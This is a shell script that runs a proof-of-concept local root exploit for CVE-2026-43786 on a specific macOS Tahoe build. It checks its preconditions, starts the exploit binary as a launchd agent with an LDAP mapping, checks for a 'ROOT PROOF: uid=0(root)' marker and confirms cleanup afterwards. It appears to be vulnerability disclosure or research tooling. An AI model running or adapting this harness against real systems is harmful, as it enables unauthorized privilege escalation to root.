#!/bin/sh
set -eu

repo_dir=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
uid=$(/usr/bin/id -u)
build=$(/usr/bin/sw_vers -buildVersion)

if [ "$uid" -eq 0 ]; then
  printf '%s\n' 'Run as a normal user.' >&2
  exit 1
fi
if [ "$build" != 25G83 ] || [ "$(/usr/bin/uname -m)" != arm64 ]; then
  printf '%s\n' 'This packaged run was validated only on macOS Tahoe 26.6.2 (25G83), arm64.' >&2
  exit 1
fi
if [ ! -f "$repo_dir/CVE-2026-43786-arm64" ]; then
  printf '%s\n' 'The arm64 binary is missing; build it from CVE-2026-43786.c first.' >&2
  exit 1
fi
binary_hash=$(/usr/bin/shasum -a 256 "$repo_dir/CVE-2026-43786-arm64" | /usr/bin/awk '{print $1}')
if [ "$binary_hash" != a37cae93e6907f8eef1a637b865082b7099d04fd33bf3b9f0af59d1cdf1cff82 ]; then
  printf '%s\n' 'The arm64 binary differs from the validated build.' >&2
  exit 1
fi
if [ ! -f /System/Library/Templates/Data/private/etc/openldap/AppleOpenLDAP.plist ]; then
  printf '%s\n' 'AppleOpenLDAP.plist is unavailable on this system.' >&2
  exit 1
fi
if /usr/sbin/lsof -nP -iTCP:389 -sTCP:LISTEN >/dev/null 2>&1; then
  printf '%s\n' 'TCP/389 already has a listener; no launchd job was started.' >&2
  exit 1
fi
if /usr/bin/id -u pocroot >/dev/null 2>&1; then
  printf '%s\n' 'The synthetic user name already resolves; no launchd job was started.' >&2
  exit 1
fi
if [ "$(/usr/bin/dscl /Search -read / CSPSearchPath 2>/dev/null)" != 'CSPSearchPath: /Local/Default' ]; then
  printf '%s\n' 'Open Directory search path is not the clean test baseline.' >&2
  exit 1
fi

workdir=$(/usr/bin/mktemp -d "${TMPDIR:-/tmp}/sg-2026-0032.XXXXXX")
label="com.teamn4c.sg-2026-0032.${uid}.$$"
agent="$workdir/agent.plist"
binary="$workdir/CVE-2026-43786"
mapping="$workdir/RFC2307.xml"
loaded=0

cleanup() {
  result=$?
  trap - EXIT HUP INT TERM
  if [ "$loaded" -eq 1 ]; then
    /bin/launchctl bootout "gui/$uid/$label" >/dev/null 2>&1 || true
  fi
  if [ "$result" -ne 0 ] && [ -x "$binary" ]; then
    "$binary" --cleanup >/dev/null 2>&1 || true
  fi
  /bin/rm -f "$agent" "$binary" "$mapping" "$workdir/run.out" "$workdir/run.err"
  /bin/rmdir "$workdir" 2>/dev/null || true
  exit "$result"
}
trap cleanup EXIT
trap 'exit 130' INT
trap 'exit 143' TERM
trap 'exit 129' HUP

/bin/cp "$repo_dir/CVE-2026-43786-arm64" "$binary"
/bin/chmod 700 "$binary"
/usr/bin/plutil -convert xml1 -o "$mapping" /System/Library/Templates/Data/private/etc/openldap/AppleOpenLDAP.plist
mapping_hash=$(/usr/bin/shasum -a 256 "$mapping" | /usr/bin/awk '{print $1}')
if [ "$mapping_hash" != 11ada614620ad70f742961a0116b8f1221d4bd160d4f45e3532562f17f66f8b6 ]; then
  printf '%s\n' 'The generated LDAP mapping differs from the validated 25G83 mapping.' >&2
  exit 1
fi
/bin/cp "$repo_dir/launchd.plist.in" "$agent"
/usr/bin/plutil -replace Label -string "$label" "$agent"
/usr/bin/plutil -replace ProgramArguments.0 -string "$binary" "$agent"
/usr/bin/plutil -replace WorkingDirectory -string "$workdir" "$agent"
/usr/bin/plutil -replace EnvironmentVariables.N4C_MAPPING_XML -string "$mapping" "$agent"
/usr/bin/plutil -replace StandardOutPath -string "$workdir/run.out" "$agent"
/usr/bin/plutil -replace StandardErrorPath -string "$workdir/run.err" "$agent"
/usr/bin/plutil -lint "$agent" >/dev/null

/bin/launchctl bootstrap "gui/$uid" "$agent"
loaded=1

attempt=0
while [ "$attempt" -lt 60 ]; do
  if [ -f "$workdir/run.out" ] && /usr/bin/grep -Fq '[+] cleanup complete' "$workdir/run.out"; then
    break
  fi
  /bin/sleep 1
  attempt=$((attempt + 1))
done

if [ -f "$workdir/run.out" ]; then
  /usr/bin/grep -aE 'running as uid|bind reply|uid=4444|ROOT PROOF|unbind reply|cleanup complete' "$workdir/run.out" || true
fi
if ! [ -f "$workdir/run.out" ] ||
   ! /usr/bin/grep -Fq '[+] ROOT PROOF: uid=0(root)' "$workdir/run.out" ||
   ! /usr/bin/grep -Fq '[+] cleanup complete' "$workdir/run.out"; then
  printf '%s\n' 'The root proof or cleanup marker was not observed.' >&2
  if [ -f "$workdir/run.err" ]; then /usr/bin/tail -n 20 "$workdir/run.err" >&2; fi
  exit 1
fi

/bin/launchctl bootout "gui/$uid/$label"
loaded=0
if /usr/sbin/lsof -nP -iTCP:389 -sTCP:LISTEN >/dev/null 2>&1 ||
   /usr/bin/id -u pocroot >/dev/null 2>&1 ||
   [ "$(/usr/bin/dscl /Search -read / CSPSearchPath 2>/dev/null)" != 'CSPSearchPath: /Local/Default' ]; then
  printf '%s\n' 'Post-run state differs from the clean baseline; inspect Open Directory and TCP/389.' >&2
  exit 1
fi
printf '%s\n' 'Post-run checks passed: no LDAP listener, synthetic user, or search-path entry remains.'
